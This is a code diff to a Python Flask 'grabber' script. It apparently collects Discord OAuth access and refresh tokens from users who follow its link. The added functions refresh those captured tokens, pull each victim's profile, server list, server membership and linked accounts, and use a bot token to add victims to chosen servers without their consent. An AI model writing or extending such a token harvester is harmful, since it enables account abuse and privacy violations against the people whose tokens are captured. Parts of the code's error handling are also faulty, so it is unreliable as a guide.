@@ -11,12 +11,16 @@ dbPath = 'resources/db.json'
 
 cTokens = []
 cRefreshes = []
-    
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(("8.8.8.8", 80))
-LOCAL_IP = s.getsockname()[0]
-EXTERNAL_IP = requests.get('https://api.ipify.org').content.decode('utf8')
-s.close()
+try:    
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    LOCAL_IP = s.getsockname()[0]
+    EXTERNAL_IP = requests.get('https://api.ipify.org').content.decode('utf8')
+    s.close()
+except Exception as err:
+    print('Error while getting ips! Exiting! Error: ', err)
+    print('Error while getting ips! Check your internet connection! Exiting!')
+    exit()
 
 if(os.path.exists(configPath)):
     print('config file exist')
@@ -66,12 +70,14 @@ else:
             break
         else:
             print('incorrect path! must start with /')
+    
     config['discord'] = {'client_id': a,
                          'client_secret': b,
                          'api': c}
     config['grabber'] = {'port': d,
                          'redirect_uri': e,
                          'grabber_url_args': f}
+    
     print('writing config file in %s' % configPath)
     with open(configPath, 'w') as conf:
         config.write(conf)
@@ -128,9 +134,91 @@ def exchange_code(code):
         'Content-Type': 'application/x-www-form-urlencoded'
     }
     r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
-    if(r):
-        r = r.json()
+    r = r.json()
+    try:
+        if(r['error'] == 'invalid_grant'):
+            print('error while exchanging codes: ', r['error_description'])
+    except:
         return r
+
+def refresh_token(refresh_token):
+    data = {
+        'client_id': CLIENT_ID,
+        'client_secret': CLIENT_SECRET,
+        'grant_type': 'refresh_token',
+        'refresh_token': refresh_token
+    }
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    r = requests.post('%s/oauth2/token' % API_ENDPOINT, data=data, headers=headers)
+    r = r.json()
+    try:
+        if(r['error'] == 'invalid_grant'):
+            print('error while refreshing token: invalid refresh_token!')
+    except:
+        return r
+
+
+def getUserInfo(token):
+    info = requests.get('%s/users/@me' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
+    info = info.json()
+    try:
+        if(info['message'] == '401: Unauthorized'):
+            print('Invalid token!')
+    except:
+        return(info)
+
+def getGuildProfile(token, guild_id):
+    guildProfile = requests.get('%s/users/@me/guilds/%s/member' % (API_ENDPOINT, guild_id), headers={'Authorization':'Bearer %s' % token})
+    guildProfile = guildProfile.json()
+    print(guildProfile)
+    try:
+        if(guildProfile['message'] == '401: Unauthorized'):
+            print('Invalid token!')
+        if(guildProfile['message'] == 'Неизвестная гильдия' or guildProfile['message'] == 'Unknown Guild'):
+            print('Invalid guild!')
+    except:
+        return(guildProfile)
+
+def getUserGuilds(token):
+    guilds = requests.get('%s/users/@me/guilds' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
+    guilds = guilds.json()
+    try:
+        if(guilds['message'] == '401: Unauthorized'):
+            print('Invalid token!')
+    except:
+        return(guilds)
     
+def getUserConnections(token):
+    connections = requests.get('%s/users/@me/connections' % API_ENDPOINT, headers={'Authorization':'Bearer %s' % token})
+    connections = connections.json()
+    try:
+        if(connections['message'] == '401: Unauthorized'):
+            print('Invalid token!')
+    except:
+        return(connections)
+
+def joinGuild(token, user_id, bot_token, guild_id):
+    data = {'access_token': token}
+    data = json.dumps(data)
+    headers = {
+        'Authorization':'Bot %s' % bot_token,
+        'Content-Type': "application/json",
+    }
+    r = requests.put('%s/guilds/%s/members/%s' % (API_ENDPOINT, guild_id, user_id), data=data, headers=headers)
+    r = r.json()
+    try:
+        if(r['message'] == '401: Unauthorized'):
+            print('Invalid bot token!')
+        elif(r['message'] == 'Invalid OAuth2 access token'):
+            print('Invalid user token!')
+        elif(r['message'] == 'Неизвестная гильдия' or r['message'] == 'Unknown Guild'):
+            print('Invalid guild id!')
+        else:
+            print(r)
+    except:
+        return(r)
+
 if __name__ == "__main__":
     app.run(debug = False, port=PORT,host=LOCAL_IP)
